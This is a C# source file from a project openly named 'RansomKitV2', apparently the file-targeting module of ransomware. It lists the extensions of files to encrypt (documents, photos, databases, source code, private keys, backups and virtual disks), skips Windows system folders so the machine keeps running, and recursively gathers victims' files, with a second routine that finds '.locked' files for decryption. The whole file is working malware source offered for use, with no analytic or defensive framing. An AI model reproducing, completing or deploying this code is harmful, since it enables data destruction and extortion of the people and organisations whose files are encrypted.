using System;
using System.Collections.Generic;
using System.IO;

namespace RansomKitV2
{
    static class Walker
    {
        // Extensions to encrypt
        static readonly HashSet<string> Targets = new(StringComparer.OrdinalIgnoreCase)
        {
            // Office / documents
            ".doc",  ".docx", ".xls",  ".xlsx", ".ppt",  ".pptx",
            ".pdf",  ".txt",  ".rtf",  ".odt",  ".ods",  ".odp",
            ".pages",".numbers",".key",
            // Images / media
            ".jpg",  ".jpeg", ".png",  ".gif",  ".bmp",  ".tiff",
            ".raw",  ".cr2",  ".nef",  ".dng",  ".heic",
            ".mp3",  ".mp4",  ".avi",  ".mov",  ".mkv",  ".flv",
            ".wmv",  ".wav",  ".flac", ".aac",  ".m4a",
            // Archives
            ".zip",  ".rar",  ".7z",   ".tar",  ".gz",   ".bz2",
            // Databases
            ".sql",  ".db",   ".mdb",  ".accdb",".sqlite",".dbf",
            // Design / dev
            ".psd",  ".ai",   ".indd", ".svg",  ".xcf",  ".fig",
            ".py",   ".js",   ".ts",   ".php",  ".html", ".css",
            ".java", ".cs",   ".cpp",  ".c",    ".h",    ".go",
            ".rs",   ".rb",   ".json", ".xml",  ".csv",  ".yml",
            ".yaml", ".env",  ".toml",
            // Keys / certs
            ".pem",  ".p12",  ".pfx",  ".cer",  ".crt",  ".pub",
            // VM / backup
            ".bak",  ".backup",".iso", ".vmdk", ".vhd",  ".vhdx",
            // eBooks
            ".epub", ".mobi",
        };

        // Directories never to recurse into
        static readonly HashSet<string> SkipDirs = new(StringComparer.OrdinalIgnoreCase)
        {
            "Windows",   "System32",  "SysWOW64",   "WinSxS",
            "Program Files","Program Files (x86)","ProgramData",
            "$Recycle.Bin","System Volume Information",
            "Boot","Recovery","PerfLogs","MicrosoftUpdate"
        };

        /// <summary>
        /// Recursively yield all encryptable files under <paramref name="root"/>.
        /// Gracefully skips access-denied directories.
        /// </summary>
        public static List<string> EnumerateTargets(string root)
        {
            var result = new List<string>();
            var queue  = new Queue<string>();
            queue.Enqueue(root);

            while (queue.Count > 0)
            {
                string dir  = queue.Dequeue();
                string name = Path.GetFileName(dir);
                if (SkipDirs.Contains(name)) continue;

                // Files in this dir
                string[] files;
                try   { files = Directory.GetFiles(dir); }
                catch { files = Array.Empty<string>(); }

                foreach (var f in files)
                {
                    string ext = Path.GetExtension(f);
                    if (Targets.Contains(ext) &&
                        !f.EndsWith(CryptoEngine.LOCKED_EXT, StringComparison.OrdinalIgnoreCase))
                        result.Add(f);
                }

                // Recurse
                string[] subs;
                try   { subs = Directory.GetDirectories(dir); }
                catch { subs = Array.Empty<string>(); }

                foreach (var s in subs) queue.Enqueue(s);
            }
            return result;
        }

        /// <summary>Collect all .locked files under a root (for decryption).</summary>
        public static List<string> EnumerateLocked(string root)
        {
            var result = new List<string>();
            var queue  = new Queue<string>();
            queue.Enqueue(root);

            while (queue.Count > 0)
            {
                string dir = queue.Dequeue();

                string[] files;
                try   { files = Directory.GetFiles(dir, "*" + CryptoEngine.LOCKED_EXT); }
                catch { files = Array.Empty<string>(); }

                foreach (var f in files) result.Add(f);

                string[] subs;
                try   { subs = Directory.GetDirectories(dir); }
                catch { subs = Array.Empty<string>(); }

                foreach (var s in subs) queue.Enqueue(s);
            }
            return result;
        }
    }
}
